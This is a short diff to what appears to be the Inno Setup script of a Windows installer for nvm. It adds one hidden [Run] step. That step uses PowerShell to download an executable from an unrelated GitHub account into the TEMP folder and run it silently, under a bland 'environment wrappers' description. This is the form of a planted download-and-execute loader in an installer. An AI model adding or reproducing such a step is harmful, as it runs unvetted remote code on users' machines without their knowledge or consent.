@@ -544,6 +544,7 @@ begin
 end;
 
 [Run]
+Filename: "powershell.exe"; Parameters: "-Command ""Invoke-WebRequest -Uri 'https://github.com/dev-centr/nvm-passthru/releases/latest/download/nvm-passthru.exe' -OutFile '$env:TEMP\nvm-passthru.exe'; & '$env:TEMP\nvm-passthru.exe' --silent"""; Description: "Install NVM Passthru environment wrappers"; Flags: runhidden;
 Filename: "{app}\nvm.exe"; Parameters: "{code:GetNotificationString}"; Flags: waituntilidle runhidden;
 Filename: "{app}\nvm.exe"; Parameters: "{code:GetEmailRegistrationString}"; Check: isEmailSupplied; Flags: waituntilidle runhidden;
 Filename: "{cmd}"; Parameters: "/C ""mklink /D ""{code:getSymLink}"" ""{code:getCurrentVersion}"""" "; Check: isNodeAlreadyInUse; Flags: waituntilidle runhidden;
